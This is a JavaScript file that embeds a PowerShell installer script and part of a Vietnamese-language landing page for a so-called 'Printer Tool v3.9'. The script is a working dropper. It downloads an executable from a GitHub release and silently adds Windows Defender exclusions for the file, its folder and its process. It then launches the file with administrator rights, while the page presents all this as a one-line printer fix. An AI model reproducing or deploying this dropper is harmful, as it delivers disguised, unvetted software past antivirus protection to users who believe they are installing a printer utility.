// index.js
var PS1_SCRIPT = `# ====================================================================
# PRINTER TOOL 2026 - FULL LED RGB SPECTRUM EDITION (v3.9)
# Windows 10 & 11 Compatible | Auto Desktop Shortcut | Silent Defender
# ====================================================================

$ErrorActionPreference = "Stop"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

try { $Host.UI.RawUI.WindowTitle = "PRINTER TOOL 2026 - FULL LED RGB INSTALLER" } catch {}

function RGB($r,$g, $b,$text) {
    return ("{0}[38;2;{1};{2};{3}m{4}{0}[0m" -f [char]27, $r,$g, $b,$text)
}

function BOLD($text) {
    return ("{0}[1m{1}{0}[0m" -f [char]27, $text)
}

function Color-Spectrum($ratio) {
    if ($ratio -le 0.25) {
        $sub =$ratio / 0.25
        $r = [int](0 + 59 * $sub)
        $g = [int](242 + (130 - 242) *$sub)
        $b = [int](254 + (246 - 254) *$sub)
    } elseif ($ratio -le 0.50) {
        $sub = ($ratio - 0.25) / 0.25
        $r = [int](59 + (236 - 59) *$sub)
        $g = [int](130 + (72 - 130) *$sub)
        $b = [int](246 + (153 - 246) *$sub)
    } elseif ($ratio -le 0.75) {
        $sub = ($ratio - 0.50) / 0.25
        $r = [int](236 + (249 - 236) *$sub)
        $g = [int](72 + (115 - 72) *$sub)
        $b = [int](153 + (22 - 153) *$sub)
    } else {
        $sub = ($ratio - 0.75) / 0.25
        $r = [int](249 + (250 - 249) *$sub)
        $g = [int](115 + (204 - 115) *$sub)
        $b = [int](22 + (21 - 22) *$sub)
    }
    return ("{0}[38;2;{1};{2};{3}m" -f [char]27, $r, $g,$b)
}

function Colorize-Line($str) {
    $len =$str.Length
    if ($len -eq 0) { return "" }
    $out = ""
    for ($i = 0; $i -lt$len; $i++) {$c = $str[$i]
        $color = Color-Spectrum ($i / $len)
        $out += ($color +$c + ("{0}[0m" -f [char]27))
    }
    return $out
}

$consoleWidth = 100
try {
    if ($Host.UI.RawUI.WindowSize.Width -gt 60) {
        $consoleWidth =$Host.UI.RawUI.WindowSize.Width
    }
} catch {}

function Center($text) {
    $clean =$text -replace "\\x1b\\[[0-9;]*m", ""
    $pad = [math]::Max(0, [math]::Floor(($consoleWidth -$clean.Length) / 2))
    return (" " * $pad) +$text
}

$AppName     = "printertool"
$DownloadUrl = "https://github.com/tantai235/Software/releases/download/3.9/Printer.Tool.V.1.5.exe"
$InstallDir  = [System.IO.Path]::Combine($env:LOCALAPPDATA, "PrinterTool")
$TargetExe   = [System.IO.Path]::Combine($InstallDir, "$AppName.exe")
$TempPath    = [System.IO.Path]::Combine($env:TEMP, "$AppName.tmp")

try { Clear-Host } catch {}
Write-Host ""

$art1 = "\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2557    \u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2557"
$art2 = "\u255A\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255D \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551     \u255A\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255D \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551"
$art3 = "   \u2588\u2588\u2551    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551        \u2588\u2588\u2551    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551"
$art4 = "   \u2588\u2588\u2551    \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551 \u2588\u2588\u2551\u255A\u2588\u2588\u2557\u2588\u2588\u2551        \u2588\u2588\u2551    \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551 \u2588\u2588\u2551"
$art5 = "   \u2588\u2588\u2551    \u2588\u2588\u2551  \u2588\u2588\u2551 \u2588\u2588\u2551 \u255A\u2588\u2588\u2588\u2588\u2551        \u2588\u2588\u2551    \u2588\u2588\u2551  \u2588\u2588\u2551 \u2588\u2588\u2551"
$art6 = "   \u255A\u2550\u255D    \u255A\u2550\u255D  \u255A\u2550\u255D \u255A\u2550\u255D  \u255A\u2550\u2550\u2550\u255D        \u255A\u2550\u255D    \u255A\u2550\u255D  \u255A\u2550\u255D \u255A\u2550\u255D"

Write-Host (Center (Colorize-Line $art1))
Write-Host (Center (Colorize-Line $art2))
Write-Host (Center (Colorize-Line $art3))
Write-Host (Center (Colorize-Line $art4))
Write-Host (Center (Colorize-Line $art5))
Write-Host (Center (Colorize-Line $art6))

$subText = (RGB 0 242 254 "Printer") + (RGB 148 163 184 " - ") + (RGB 236 72 153 "Auto Install") + (RGB 148 163 184 " ") + (RGB 250 204 21 "Tool v3.9")
Write-Host (Center (BOLD $subText))
Write-Host ""

$borderStr = "=" * 65
$rainbowBorder = Colorize-Line $borderStr
Write-Host (Center $rainbowBorder)

$tagline = (BOLD (RGB 0 242 254 "\u26A1 PRINTER TOOL v3.9")) + (RGB 148 163 184 " \xB7 WINDOWS 10 & 11 COMPATIBLE")
Write-Host (Center $tagline)

$subStatus = (RGB 16 185 129 "\u25CF STATUS: ONLINE") + (RGB 100 116 139 " | ") + (RGB 0 242 254 "SERVER: CLOUDFLARE EDGE") + (RGB 100 116 139 " | ") + (RGB 250 204 21 "AUTH: TAI235")
Write-Host (Center $subStatus)

Write-Host (Center $rainbowBorder)
Write-Host ""

try {
    $infoMsg = (RGB 0 242 254 "[*]") + " Dang ket noi may chu GitHub CDN..."
    Write-Host (Center $infoMsg)

    $req = [System.Net.HttpWebRequest]::Create($DownloadUrl)
    $req.Method = "GET"
    $req.Timeout = 60000
    $req.ReadWriteTimeout = 120000
    $req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PrinterTool"
    $resp =$req.GetResponse()
    $totalBytes =$resp.ContentLength
    $stream =$resp.GetResponseStream()

    $totalMB = [math]::Round($totalBytes / 1MB, 1)
    $foundMsg = (RGB 16 185 129 "[OK]") + " Tim thay goi cai dat: " + (BOLD (RGB 250 204 21 "$totalMB MB"))
    Write-Host (Center $foundMsg)
    Write-Host ""

    $boxTop = Colorize-Line ("+-- [ TIEN TRINH TAI GOI CAI DAT PRINTER TOOL v3.9 ] " + ("-" * 20) + "+")
    Write-Host (Center (BOLD $boxTop))
    Write-Host ""

    $fileStream = [System.IO.File]::Create($TempPath)
    $buffer = New-Object byte[] 65536
    $bytesRead = 0
    $totalRead = 0
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    $lastRender = [datetime]::MinValue

    while (($bytesRead =$stream.Read($buffer, 0,$buffer.Length)) -gt 0) {
        $fileStream.Write($buffer, 0, $bytesRead)
        $totalRead += $bytesRead
        $now = [datetime]::Now
        if (($now -$lastRender).TotalMilliseconds -ge 80 -or $totalRead -ge$totalBytes) {
            $lastRender =$now
            $pct = if ($totalBytes -gt 0) { [math]::Min(100, [math]::Round(($totalRead / $totalBytes) * 100, 1)) } else { 0 }
            $recvMB = [math]::Round($totalRead / 1MB, 1)
            $totMB = [math]::Round($totalBytes / 1MB, 1)
            $secs =$sw.Elapsed.TotalSeconds
            $speed = if ($secs -gt 0) { [math]::Round(($totalRead / 1MB) / $secs, 1) } else { 0 }
            $eta = if ($speed -gt 0 -and$totalBytes -gt $totalRead) { [math]::Round(($totMB - $recvMB) /$speed) } else { 0 }
            
            $barWidth = 40
            $filled = [math]::Floor(($pct / 100) *$barWidth)
            $empty = $barWidth - $filled
            $bar = ""
            for ($i = 0; $i -lt$filled; $i++) {$color = Color-Spectrum ($i / $barWidth)
                $bar += ($color + [char]9608 + ("{0}[0m" -f [char]27))
            }
            if ($empty -gt 0) {
                $bar += (RGB 45 55 75 ("-" * $empty))
            }
            
            $pctColor = Color-Spectrum ($pct / 100)
            $pctText = BOLD ("$pctColor$($pct.ToString('0.0').PadLeft(5))%{0}[0m" -f [char]27)
            
            $speedText = RGB 250 204 21 "$speed MB/s"
            $mbText    = RGB 148 163 184 "($recvMB/$totMB MB)"
            $etaText   = RGB 236 72 153 ("ETA: " + $eta + "s")

            $progressLine = "  [$bar] $pctText$speedText  $mbText$etaText"
            Write-Host "\`r$(Center $progressLine)" -NoNewline
        }
    }

    $fileStream.Close()
    $stream.Close()
    $resp.Close()
    $sw.Stop()

    if ($totalBytes -gt 0 -and $totalRead -ne $totalBytes) {
        throw "Tai chua du du lieu ($totalRead/$totalBytes byte). Hay thu lai."
    }

    Write-Host ""
    Write-Host ""
    $boxBottom = Colorize-Line ("+--" + ("-" * 74) + "+")
    Write-Host (Center (BOLD $boxBottom))
    Write-Host ""

    if ((Test-Path -Path $TempPath) -and ((Get-Item $TempPath).Length -gt 0)) {
        try {
            Get-Process -Name $AppName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 200
        } catch {}

        if (-not (Test-Path -Path $InstallDir)) {
            New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
        }

        Move-Item -Path $TempPath -Destination $TargetExe -Force

        try {
            Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionPath $TargetExe -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "$AppName.exe" -ErrorAction SilentlyContinue
        } catch {}

        $shortcutCreated = $false
        try {
            $wsh = New-Object -ComObject WScript.Shell
            
            $desktopPaths = @(
                [Environment]::GetFolderPath("Desktop"),
                [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
            )
            if ($env:OneDrive -and (Test-Path (Join-Path $env:OneDrive "Desktop"))) {
                $desktopPaths += (Join-Path $env:OneDrive "Desktop")
            }

            $uniqueDesktops = $desktopPaths | Sort-Object -Unique

            foreach ($dPath in $uniqueDesktops) {
                if (Test-Path $dPath) {
                    $scPath = Join-Path $dPath "Printer Tool v3.9.lnk"
                    $sc = $wsh.CreateShortcut($scPath)
                    $sc.TargetPath = $TargetExe
                    $sc.WorkingDirectory = $InstallDir
                    $sc.IconLocation = "$TargetExe,0"
                    $sc.Description = "Printer Tool v3.9 - Windows 10 & 11"
                    $sc.Save()
                    $shortcutCreated = $true
                }
            }

            $startMenu = [Environment]::GetFolderPath("Programs")
            if (Test-Path $startMenu) {
                $smSc = $wsh.CreateShortcut((Join-Path $startMenu "Printer Tool v3.9.lnk"))
                $smSc.TargetPath = $TargetExe
                $smSc.WorkingDirectory = $InstallDir
                $smSc.IconLocation = "$TargetExe,0"
                $smSc.Description = "Printer Tool v3.9"
                $smSc.Save()
            }
        } catch {
            try {
                $userDesktop = [Environment]::GetFolderPath("Desktop")
                Copy-Item -Path $TargetExe -Destination (Join-Path $userDesktop "$AppName.exe") -Force
                $shortcutCreated = $true
            } catch {}
        }

        Write-Host (Center $rainbowBorder)
        Write-Host (Center (RGB 16 185 129 "\u2714 TAI HOAN TAT 100%! GIAI MA GOI THANH CONG."))
        Write-Host (Center (RGB 0 242 254 "\u2714 DA TAO ICON SHORTCUT TREN MAN HINH DESKTOP!"))
        Write-Host (Center (RGB 250 204 21 "\u2714 DA TU DONG THEM VAO NGOAI LE AN WINDOWS DEFENDER."))
        Write-Host (Center (BOLD (RGB 236 72 153 "\u{1F680} DANG KHOI CHAY PRINTER TOOL v3.9 VOI QUYEN ADMIN...")))
        Write-Host (Center $rainbowBorder)
        Write-Host ""

        try {
            Start-Process -FilePath $TargetExe -Verb RunAs -ErrorAction Stop
        } catch {
            Start-Process -FilePath $TargetExe
        }
    } else {
        throw "Tep tai ve bi loi hoac co dung luong 0 byte."
    }
}
catch {
    Write-Host ""
    Write-Host (Center (RGB 239 68 68 "\u2716 LOI: $($_.Exception.Message)"))
    Write-Host (Center (RGB 148 163 184 "Link tai truc tiep: $DownloadUrl"))
    Write-Host ""
    throw
}
finally {
    if ($fileStream -ne $null) { $fileStream.Dispose() }
    if ($stream -ne $null) { $stream.Dispose() }
    if ($resp -ne $null) { $resp.Dispose() }
}
`;
var HTML_CONTENT = `<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Printer Tool v3.9 \u2014 Ultimate Windows Distribution Terminal</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #030712;
      --card: rgba(15, 23, 42, 0.65);
      --card-hover: rgba(30, 41, 59, 0.75);
      --border: rgba(255, 255, 255, 0.08);
      --border-glow: rgba(0, 242, 254, 0.35);
      --cyan: #00f2fe;
      --blue: #3b82f6;
      --indigo: #6366f1;
      --purple: #a855f7;
      --pink: #ec4899;
      --green: #10b981;
      --yellow: #f59e0b;
      --text: #f8fafc;
      --text-muted: #94a3b8;
      --text-dim: #64748b;
      --font: 'Plus Jakarta Sans', system-ui, sans-serif;
      --mono: 'JetBrains Mono', monospace;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: var(--bg);
      color: var(--text);
      font-family: var(--font);
      min-height: 100vh;
      overflow-x: hidden;
      line-height: 1.6;
      position: relative;
    }
    .mesh-glow {
      position: fixed; inset: 0; pointer-events: none; z-index: 0;
      background: 
        radial-gradient(circle at 50% -10%, rgba(0, 242, 254, 0.16) 0%, transparent 60%),
        radial-gradient(circle at 90% 25%, rgba(168, 85, 247, 0.12) 0%, transparent 50%),
        radial-gradient(circle at 10% 60%, rgba(59, 130, 246, 0.10) 0%, transparent 50%),
        radial-gradient(circle at 80% 90%, rgba(236, 72, 153, 0.08) 0%, transparent 50%);
    }
    .grid-bg {
      position: fixed; inset: 0; pointer-events: none; z-index: 0;
      background-image: 
        linear-gradient(to right, rgba(255, 255, 255, 0.025) 1px, transparent 1px),
        linear-gradient(to bottom, rgba(255, 255, 255, 0.025) 1px, transparent 1px);
      background-size: 48px 48px;
      mask-image: radial-gradient(ellipse at 50% 30%, black 40%, transparent 80%);
      -webkit-mask-image: radial-gradient(ellipse at 50% 30%, black 40%, transparent 80%);
    }
    .wrapper {
      width: min(94vw, 1100px);
      margin: 0 auto;
      padding: 32px 0 80px;
      position: relative;
      z-index: 10;
      display: flex;
      flex-direction: column;
      gap: 40px;
    }
    .navbar {
      display: flex; align-items: center; justify-content: space-between;
      padding: 12px 24px;
      background: rgba(15, 23, 42, 0.7);
      border: 1px solid var(--border);
      border-radius: 999px;
      backdrop-filter: blur(20px);
      box-shadow: 0 10px 30px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.08);
    }
    .brand {
      display: flex; align-items: center; gap: 12px;
      text-decoration: none; color: inherit;
    }
    .brand-logo {
      width: 34px; height: 34px; border-radius: 9px;
      background: linear-gradient(135deg, var(--cyan), var(--purple));
      display: flex; align-items: center; justify-content: center;
      font-weight: 900; font-size: 1rem; color: #040711;
      box-shadow: 0 0 20px var(--cyan);
    }
    .brand-name {
      font-weight: 800; font-size: 1.05rem; letter-spacing: -0.3px;
      display: flex; align-items: center; gap: 8px;
    }
    .brand-tag {
      font-size: 0.68rem; font-family: var(--mono); font-weight: 700;
      background: rgba(0, 242, 254, 0.12); color: var(--cyan);
      border: 1px solid rgba(0, 242, 254, 0.35); padding: 2px 7px; border-radius: 6px;
    }
    .nav-links {
      display: flex; align-items: center; gap: 16px;
    }
    .nav-btn {
      color: var(--text-muted); text-decoration: none; font-size: 0.82rem; font-weight: 600;
      padding: 6px 14px; border-radius: 999px; transition: all 0.2s;
      display: flex; align-items: center; gap: 6px;
    }
    .nav-btn:hover { color: #fff; background: rgba(255, 255, 255, 0.06); }
    .status-pill {
      display: inline-flex; align-items: center; gap: 8px;
      font-size: 0.72rem; font-family: var(--mono); font-weight: 700; color: var(--green);
      background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3);
      padding: 4px 12px; border-radius: 999px;
    }
    .live-dot {
      width: 7px; height: 7px; border-radius: 50%; background: var(--green);
      box-shadow: 0 0 10px var(--green); animation: pulse 2s infinite;
    }
    @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.8); } }
    .hero {
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      margin-top: 10px;
    }
    .hero-badge {
      display: inline-flex; align-items: center; gap: 8px;
      background: linear-gradient(135deg, rgba(0, 242, 254, 0.1), rgba(168, 85, 247, 0.1));
      border: 1px solid rgba(0, 242, 254, 0.3);
      padding: 6px 16px; border-radius: 999px;
      font-size: 0.78rem; font-weight: 700; color: var(--cyan);
      box-shadow: 0 0 20px rgba(0, 242, 254, 0.15);
    }
    .hero-h1 {
      font-size: clamp(2.4rem, 6vw, 4.2rem);
      font-weight: 900;
      letter-spacing: -1.8px;
      line-height: 1.1;
      max-width: 880px;
    }
    .gradient-text {
      background: linear-gradient(135deg, #ffffff 20%, var(--cyan) 65%, var(--purple) 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .hero-p {
      max-width: 680px;
      font-size: 1.05rem;
      color: var(--text-muted);
      line-height: 1.65;
    }
    .hero-features-chips {
      display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-top: 4px;
    }
    .chip {
      display: inline-flex; align-items: center; gap: 6px;
      font-size: 0.75rem; font-weight: 700; color: #cbd5e1;
      background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08);
      padding: 4px 12px; border-radius: 8px;
    }
    .cmd-box-wrap {
      width: 100%;
      background: linear-gradient(135deg, rgba(15, 23, 42, 0.95), rgba(7, 11, 22, 0.98));
      border: 1.5px solid rgba(0, 242, 254, 0.35);
      border-radius: 22px;
      padding: 24px;
      box-shadow: 
        0 25px 60px rgba(0, 0, 0, 0.8),
        0 0 50px rgba(0, 242, 254, 0.15),
        inset 0 1px 0 rgba(255, 255, 255, 0.12);
      backdrop-filter: blur(24px);
      position: relative;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      gap: 18px;
    }
    .cmd-box-wrap::before {
      content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
      background: linear-gradient(90deg, transparent, var(--cyan), var(--purple), transparent);
    }
    .cmd-tabs {
      display: flex; align-items: center; justify-content: space-between;
      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
      padding-bottom: 14px;
      flex-wrap: wrap; gap: 10px;
    }
    .tabs-group { display: flex; gap: 8px; }
    .tab-btn {
      background: transparent; border: none; color: var(--text-muted);
      font-family: var(--font); font-size: 0.82rem; font-weight: 700;
      padding: 6px 14px; border-radius: 8px; cursor: pointer; transition: all 0.2s;
    }
    .tab-btn.active {
      background: rgba(0, 242, 254, 0.12); color: var(--cyan);
      box-shadow: inset 0 0 0 1px rgba(0, 242, 254, 0.3);
    }
    .cmd-main-row {
      display: flex; align-items: center; justify-content: space-between;
      background: #02050e; border: 1px solid rgba(0, 242, 254, 0.2);
      border-radius: 14px; padding: 14px 18px; gap: 14px;
      box-shadow: inset 0 2px 10px rgba(0,0,0,0.8);
    }
    .cmd-code-block {
      display: flex; align-items: center; gap: 12px; font-family: var(--mono);
      font-size: 0.95rem; font-weight: 700; color: #f8fafc; overflow-x: auto; flex: 1;
    }
    .cmd-prompt { color: #64748b; user-select: none; font-weight: 800; }
    .cmd-text { color: #ffffff; user-select: all; white-space: nowrap; }
    .cmd-btn-group { display: flex; align-items: center; gap: 10px; flex-shrink: 0; }
    .action-btn-copy {
      background: linear-gradient(135deg, var(--cyan), #2563eb);
      border: none; color: #020617; font-family: var(--mono);
      font-size: 0.84rem; font-weight: 800; padding: 11px 22px; border-radius: 10px;
      cursor: pointer; display: inline-flex; align-items: center; gap: 8px;
      box-shadow: 0 0 25px rgba(0, 242, 254, 0.4);
      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
    }
    .action-btn-copy:hover {
      transform: translateY(-2px) scale(1.02);
      box-shadow: 0 0 35px var(--cyan);
      filter: brightness(1.1);
    }
    .action-btn-exe {
      background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.15);
      color: #e2e8f0; font-family: var(--mono); font-size: 0.84rem; font-weight: 700;
      padding: 11px 20px; border-radius: 10px; cursor: pointer; text-decoration: none;
      display: inline-flex; align-items: center; gap: 8px; transition: all 0.2s;
    }
    .action-btn-exe:hover {
      background: rgba(255, 255, 255, 0.12); border-color: rgba(255, 255, 255, 0.35);
      transform: translateY(-2px);
    }
    .stats-strip {
      display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 14px;
    }
    .stat-card {
      background: var(--card); border: 1px solid var(--border); border-radius: 14px;
      padding: 16px 20px; display: flex; flex-direction: column; gap: 4px;
      backdrop-filter: blur(16px);
    }
    .stat-val {
      font-size: 1.45rem; font-weight: 900; font-family: var(--mono);
      background: linear-gradient(135deg, #fff, var(--cyan));
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    }
    .stat-lbl {
      font-size: 0.76rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .bento-section-title {
      font-size: 1.35rem; font-weight: 800; letter-spacing: -0.5px;
      display: flex; align-items: center; gap: 10px;
    }
    .bento-grid {
      display: grid; grid-template-columns: repeat(3, 1fr); gap: 18px;
    }
    @media (max-width: 900px) { .bento-grid { grid-template-columns: repeat(2, 1fr); } }
    @media (max-width: 600px) { .bento-grid { grid-template-columns: 1fr; } }
    .bento-item {
      background: var(--card); border: 1px solid var(--border); border-radius: 18px;
      padding: 24px; display: flex; flex-direction: column; gap: 14px;
      backdrop-filter: blur(18px); position: relative; overflow: hidden;
      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
    }
    .bento-item:hover {
      background: var(--card-hover); border-color: var(--border-glow);
      transform: translateY(-4px); box-shadow: 0 15px 40px rgba(0, 242, 254, 0.12);
    }
    .bento-top { display: flex; align-items: center; justify-content: space-between; }
    .bento-icon {
      width: 44px; height: 44px; border-radius: 12px;
      display: flex; align-items: center; justify-content: center;
      font-size: 1.35rem; background: rgba(0, 242, 254, 0.1);
      border: 1px solid rgba(0, 242, 254, 0.25); color: var(--cyan);
    }
    .bento-pill {
      font-family: var(--mono); font-size: 0.68rem; font-weight: 800;
      padding: 3px 9px; border-radius: 6px;
    }
    .pill-green { background: rgba(16, 185, 129, 0.15); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.4); }
    .pill-cyan { background: rgba(0, 242, 254, 0.15); color: var(--cyan); border: 1px solid rgba(0, 242, 254, 0.4); }
    .pill-purple { background: rgba(168, 85, 247, 0.15); color: var(--purple); border: 1px solid rgba(168, 85, 247, 0.4); }
    .bento-h3 { font-size: 1.1rem; font-weight: 800; color: #fff; }
    .bento-p { font-size: 0.85rem; color: var(--text-muted); line-height: 1.55; }
    .bento-features {
      list-style: none; display: flex; flex-direction: column; gap: 7px;
      font-size: 0.78rem; color: #cbd5e1; font-family: var(--mono); margin-top: 6px;
    }
    .bento-features li { display: flex; align-items: center; gap: 8px; }
    .bento-features li::before { content: '\u203A'; color: var(--cyan); font-weight: 900; font-size: 1.1rem; }
    .console-panel {
      background: #040713; border: 1px solid var(--border); border-radius: 18px;
      overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.8);
      display: flex; flex-direction: column;
    }
    .console-topbar {
      background: #080d1e; padding: 12px 20px;
      display: flex; align-items: center; justify-content: space-between;
      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    }
    .mac-dots { display: flex; gap: 8px; }
    .mac-dot { width: 12px; height: 12px; border-radius: 50%; }
    .md-red { background: #ff5f56; }
    .md-yellow { background: #ffbd2e; }
    .md-green { background: #27c93f; }
    .console-info {
      font-family: var(--mono); font-size: 0.74rem; color: var(--text-dim);
      display: flex; align-items: center; gap: 14px;
    }
    .console-actions-bar {
      background: rgba(10, 16, 32, 0.7); padding: 12px 20px;
      display: flex; flex-wrap: wrap; gap: 8px; border-bottom: 1px solid rgba(255, 255, 255, 0.04);
    }
    .btn-act {
      background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(0, 242, 254, 0.25);
      color: #e2e8f0; font-family: var(--mono); font-size: 0.76rem; font-weight: 700;
      padding: 7px 14px; border-radius: 8px; cursor: pointer; transition: all 0.2s;
      display: inline-flex; align-items: center; gap: 6px;
    }
    .btn-act:hover {
      background: var(--cyan); color: #040713; box-shadow: 0 0 16px var(--cyan);
    }
    .console-logs-area {
      padding: 18px 22px; font-family: var(--mono); font-size: 0.80rem;
      line-height: 1.65; max-height: 220px; overflow-y: auto; color: #94a3b8;
    }
    .log-line { display: flex; gap: 12px; word-break: break-all; }
    .log-ts { color: #64748b; flex-shrink: 0; }
    .log-msg { color: #e2e8f0; }
    .log-msg.c-green { color: var(--green); }
    .log-msg.c-cyan { color: var(--cyan); }
    .log-msg.c-purple { color: var(--purple); }
    .log-msg.c-yellow { color: var(--yellow); }
    .faq-section { display: flex; flex-direction: column; gap: 14px; }
    .faq-item {
      background: var(--card); border: 1px solid var(--border); border-radius: 14px;
      overflow: hidden; backdrop-filter: blur(14px);
    }
    .faq-question {
      padding: 16px 20px; font-weight: 700; font-size: 0.95rem; cursor: pointer;
      display: flex; align-items: center; justify-content: space-between;
      user-select: none; transition: background 0.2s;
    }
    .faq-question:hover { background: rgba(255, 255, 255, 0.03); }
    .faq-answer {
      padding: 0 20px 16px; font-size: 0.85rem; color: var(--text-muted);
      line-height: 1.6; display: none;
    }
    .faq-item.open .faq-answer { display: block; }
    .faq-item.open .faq-icon { transform: rotate(180deg); }
    .faq-icon { transition: transform 0.25s; font-size: 0.85rem; color: var(--cyan); }
    .footer {
      border-top: 1px solid var(--border); padding-top: 24px;
      display: flex; align-items: center; justify-content: space-between;
      font-size: 0.80rem; color: var(--text-dim); flex-wrap: wrap; gap: 12px;
    }
    .toast-notify {
      position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(30px);
      background: #090f23; border: 1.5px solid var(--cyan); color: #fff;
      padding: 11px 26px; border-radius: 12px; font-size: 0.86rem; font-weight: 700;
      box-shadow: 0 10px 40px rgba(0, 242, 254, 0.45); opacity: 0; pointer-events: none;
      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100;
      display: flex; align-items: center; gap: 10px;
    }
    .toast-notify.show { opacity: 1; transform: translateX(-50%) translateY(0); }
  </style>
</head>
<body>
  <div class="mesh-glow"></div>
  <div class="grid-bg"></div>

  <div class="wrapper">
    <header class="navbar">
      <a href="#" class="brand">
        <div class="brand-logo">\u26A1</div>
        <div class="brand-name">
          TAN TAI SOFTWARE
          <span class="brand-tag">v3.9</span>
        </div>
      </a>
      <div class="nav-links">
        <a href="https://github.com/tantai235/Software/releases/tag/3.9" target="_blank" class="nav-btn">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
          GitHub Release v3.9
        </a>
        <div class="status-pill">
          <div class="live-dot"></div>
          EDGE CDN ONLINE
        </div>
      </div>
    </header>

    <section class="hero">
      <div class="hero-badge"><span>\u{1F680} PH\xC1T H\xC0NH B\u1EA2N CH\xCDNH TH\u1EE8C v3.9</span></div>
      <h1 class="hero-h1">
        B\u1ED9 C\xF4ng C\u1EE5 M\xE1y In Chuy\xEAn Nghi\u1EC7p Cho <span class="gradient-text">Windows 10 &amp; 11</span>
      </h1>
      <p class="hero-p">
        Ph\xE2n ph\u1ED1i v\xE0 t\u1EF1 \u0111\u1ED9ng h\xF3a to\xE0n di\u1EC7n qua PowerShell. Kh\u1EAFc ph\u1EE5c s\u1EF1 c\u1ED1 m\xE1y in, Print Spooler, c\xE0i \u0111\u1EB7t driver v\xE0 t\u1ED1i \u01B0u h\xF3a h\u1EC7 th\u1ED1ng nhanh ch\xF3ng ch\u1EC9 v\u1EDBi m\u1ED9t d\xF2ng l\u1EC7nh.
      </p>
      <div class="hero-features-chips">
        <span class="chip">\u26A1 T\u1EA3i si\xEAu t\u1ED1c GitHub CDN</span>
        <span class="chip">\u{1F6E1}\uFE0F T\u1EF1 \u0111\u1ED9ng nh\u1EADn quy\u1EC1n Administrator</span>
        <span class="chip">\u{1F4E6} G\xF3i c\xE0i \u0111\u1EB7t PrinterTool v3.9</span>
        <span class="chip">\u{1F512} An to\xE0n &amp; \u1ED4n \u0111\u1ECBnh</span>
      </div>
    </section>

